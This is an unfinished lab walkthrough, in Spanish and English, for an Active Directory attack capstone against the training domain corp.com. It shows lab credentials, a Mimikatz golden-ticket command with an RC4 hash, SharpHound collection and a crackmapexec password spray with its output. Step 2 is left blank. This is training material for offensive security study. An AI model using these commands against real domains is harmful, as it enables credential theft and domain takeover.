@@ -1,0 +1,74 @@
+# Walk: Attacking Active Directory Authentication - VM Group 2
+
+## Fecha: 04/07/2025
+## Objetivo
+Capstone Exercise: Once VM Group 2 is started, the domain corp.com has been modified. 
+Use the techniques from this Module to obtain access to the user account maria and log in to the domain controller. 
+To perform the initial enumeration steps you can use pete with the password Nexus123!. 
+You'll find the flag on the Desktop of the domain administrator on DC1. 
+If you obtain a hash to crack, create and utilize a rule file which adds nothing, a "1", or a "!" to the passwords of rockyou.txt.
+## Herramientas
+1. tool - 1 
+2. tool - 2
+## Procedimiento y comandos
+
+#### Paso 1: Entramos como `pete` y enumeramos:
+
+* Archivo Command.txt
+```powershell
+PS C:\Users\pete> dir
+
+    Directory: C:\Users\pete
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-r---         9/12/2022   9:25 AM                3D Objects
+d-r---         9/12/2022   9:25 AM                Contacts
+d-r---         9/12/2022   9:25 AM                Desktop
+d-r---         9/12/2022   9:25 AM                Documents
+d-r---         9/12/2022   9:25 AM                Downloads
+d-r---         9/12/2022   9:25 AM                Favorites
+d-r---         9/12/2022   9:25 AM                Links
+d-r---         9/12/2022   9:25 AM                Music
+d-r---         9/12/2022   9:25 AM                Pictures
+d-r---         9/12/2022   9:25 AM                Saved Games
+d-r---         9/12/2022   9:25 AM                Searches
+d-r---         9/12/2022   9:25 AM                Videos
+-a----         9/12/2022   9:26 AM            184 command.txt
+
+
+PS C:\Users\pete> type command.txt
+kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369-1105 /domain:corp.com /ptt /target:client75.corp.com /service:cifs /rc4:b57715dcb5b529f212a9a4effd03aaf6 /user:jeffadmin
+PS C:\Users\pete>
+```
+
+* Subimos SharpHound
+
+```powershell
+PS C:\Tools> Invoke-BloodHound -CollectionMethod All -OutputDirectory "C:\Users\pete\"
+```
+* Obtenemos el archivo:
+
+```powershell
+
+```
+* Propagamos las credenciales con crackmapexec:
+```bash
+┌──(root㉿kali)-[/home/kali]
+└─# crackmapexec smb 192.168.226.70-76 -u pete -p 'Nexus123!'
+SMB         192.168.226.72  445    WEB04            [*] Windows Server 2022 Build 20348 x64 (name:WEB04) (domain:corp.com) (signing:False) (SMBv1:False)
+SMB         192.168.226.70  445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:corp.com) (signing:True) (SMBv1:False)
+SMB         192.168.226.73  445    FILES04          [*] Windows Server 2022 Build 20348 x64 (name:FILES04) (domain:corp.com) (signing:False) (SMBv1:False)
+SMB         192.168.226.74  445    CLIENT74         [*] Windows 11 Build 22000 x64 (name:CLIENT74) (domain:corp.com) (signing:False) (SMBv1:False)
+SMB         192.168.226.75  445    CLIENT75         [*] Windows 11 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
+SMB         192.168.226.72  445    WEB04            [+] corp.com\pete:Nexus123! 
+SMB         192.168.226.70  445    DC1              [+] corp.com\pete:Nexus123! 
+SMB         192.168.226.73  445    FILES04          [+] corp.com\pete:Nexus123! 
+SMB         192.168.226.74  445    CLIENT74         [+] corp.com\pete:Nexus123! 
+SMB         192.168.226.75  445    CLIENT75         [+] corp.com\pete:Nexus123!
+```
+
+#### Paso 2: ...
+
+## Troubleshooting
+
